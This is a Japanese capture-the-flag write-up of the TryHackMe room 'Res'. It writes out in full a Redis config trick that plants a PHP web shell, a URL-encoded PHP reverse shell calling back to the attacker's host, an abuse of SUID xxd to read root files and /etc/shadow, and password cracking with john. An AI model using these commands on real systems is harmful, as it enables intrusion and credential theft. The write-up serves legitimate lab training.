# Res CTF

https://tryhackme.com/room/res

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.71.252
root@ip-10-10-103-203:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-16 06:24 GMT
Nmap scan report for 10.10.71.252
Host is up (0.0079s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
80/tcp   open  http
6379/tcp open  redis
MAC Address: 02:72:8F:10:E7:E7 (Unknown)

root@ip-10-10-103-203:~# sudo nmap -sV -p80,6379 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-16 06:25 GMT
Nmap scan report for 10.10.71.252
Host is up (0.00011s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
6379/tcp open  redis   Redis key-value store 6.0.7
MAC Address: 02:72:8F:10:E7:E7 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.38 seconds
```

HTTP, Redis

### gobuster

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

gobuster dir -x=txt,php -u http://$TARGET -w ./dirlist.txt -t 30
```

特に何も出なかった。

## Redis

```shell
$ redis-cli -h 10.10.71.252 -p 6379
10.10.71.252:6379> keys *
(empty array)
10.10.71.252:6379> info KEYSPACE
# Keyspace
```

全くデータが入っていない。

### CVE-2022-24735

https://nvd.nist.gov/vuln/detail/cve-2022-24735

Redis key-value store 6.0.7 のため、6.2.7 で修正されたこの脆弱性は有効と思われる。

https://github.com/redis/redis/pull/10651  
を読んだら脆弱性の内容は大体理解できたが、具体的な攻撃方法が分からない。

### PHP Webシェル

上の脆弱性とは関係ないが、hacktricks に分かりやすい攻撃が載っていた。  
https://book.hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html?highlight=redis#php-webshell

redis.php を Webシェルとして保存する。

```shell
$ redis-cli -h 10.10.71.252 -p 6379                         
10.10.71.252:6379> config set dir /var/www/html
OK
10.10.71.252:6379> config set dbfilename redis.php
OK
10.10.71.252:6379> set test "<?=`$_GET[0]`?>"
OK
10.10.71.252:6379> save
OK
```

リバースシェルをURLエンコードしてリクエストする。

http://10.10.71.252/redis.php?0=%70%68%70%20%2d%72%20%27%24%73%6f%63%6b%3d%66%73%6f%63%6b%6f%70%65%6e%28%22%31%30%2e%32%2e%32%32%2e%31%38%32%22%2c%36%36%36%36%29%3b%65%78%65%63%28%22%73%68%20%3c%26%33%20%3e%26%33%20%32%3e%26%33%22%29%3b%27

```shell
$ nc -nvlp 6666
listening on [any] 6666 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.71.252] 33092
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

リバースシェル取得成功。

```shell
www-data@ubuntu:/var/www/html$ ls -al /home/vianka
total 44
drwxr-xr-x 5 vianka vianka 4096 Sep  2  2020 .
drwxr-xr-x 3 root   root   4096 Sep  1  2020 ..
-rw------- 1 vianka vianka 3550 Sep  2  2020 .bash_history
-rw-r--r-- 1 vianka vianka  220 Sep  1  2020 .bash_logout
-rw-r--r-- 1 vianka vianka 3771 Sep  1  2020 .bashrc
drwx------ 2 vianka vianka 4096 Sep  1  2020 .cache
drwxrwxr-x 2 vianka vianka 4096 Sep  2  2020 .nano
-rw-r--r-- 1 vianka vianka  655 Sep  1  2020 .profile
-rw-r--r-- 1 root   root   1069 Sep  2  2020 .service: Failed with result start-limit-hit?
-rw-r--r-- 1 vianka vianka    0 Sep  1  2020 .sudo_as_admin_successful
drwxrwxr-x 7 vianka vianka 4096 Sep  2  2020 redis-stable
-rw-rw-r-- 1 vianka vianka   35 Sep  2  2020 user.txt
www-data@ubuntu:/var/www/html$ cat /home/vianka/user.txt
thm{........................}
```

ユーザーフラグゲット。

## 権限昇格

SUID

```shell
www-data@ubuntu:/home/vianka/redis-stable$ find / -perm -u=s -type f -ls 2>/dev/null
   260171     44 -rwsr-xr-x   1 root     root        44168 May  7  2014 /bin/ping
   275693     32 -rwsr-xr-x   1 root     root        30800 Jul 12  2016 /bin/fusermount
   260240     40 -rwsr-xr-x   1 root     root        40152 Jan 27  2020 /bin/mount
   260291     40 -rwsr-xr-x   1 root     root        40128 Mar 26  2019 /bin/su
   260172     44 -rwsr-xr-x   1 root     root        44680 May  7  2014 /bin/ping6
   260250     28 -rwsr-xr-x   1 root     root        27608 Jan 27  2020 /bin/umount
   265384     72 -rwsr-xr-x   1 root     root        71824 Mar 26  2019 /usr/bin/chfn
   262073     20 -rwsr-xr-x   1 root     root        18552 Mar 18  2020 /usr/bin/xxd
   260256     40 -rwsr-xr-x   1 root     root        39904 Mar 26  2019 /usr/bin/newgrp
   262026    136 -rwsr-xr-x   1 root     root       136808 Jan 31  2020 /usr/bin/sudo
   265385     56 -rwsr-xr-x   1 root     root        54256 Mar 26  2019 /usr/bin/passwd
   265386     76 -rwsr-xr-x   1 root     root        75304 Mar 26  2019 /usr/bin/gpasswd
   265388     40 -rwsr-xr-x   1 root     root        40432 Mar 26  2019 /usr/bin/chsh
   260700     12 -rwsr-xr-x   1 root     root        10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
   263387     44 -rwsr-xr--   1 root     messagebus    42992 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   277269     16 -r-sr-xr-x   1 root     root          13628 Sep  1  2020 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
   277292     16 -r-sr-xr-x   1 root     root          14320 Sep  1  2020 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
```

xxd にSUIDが付いている。

```shell
www-data@ubuntu:/home/vianka/redis-stable$ xxd /root/root.txt | xxd -r
thm{...............}
```

ルートフラグゲット。

質問に答えるために、ローカルユーザーのパスワードを手に入れる必要がある。

```shell
www-data@ubuntu:/home/vianka/redis-stable$ xxd /etc/shadow | xxd -r
root:!:18507:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:18506:0:99999:7:::
uuidd:*:18506:0:99999:7:::
vianka:$6$2p.（ひみつ）:18507:0:99999:7:::
```

パスワードが設定されているのは vianka だけ。

```shell
$ john --wordlist=/usr/share/wordlists/rockyou.txt ./shadow
```

一瞬でクラックできた。

## 振り返り

- redisにこんな機能があるとは知らなかったので良い勉強になった。
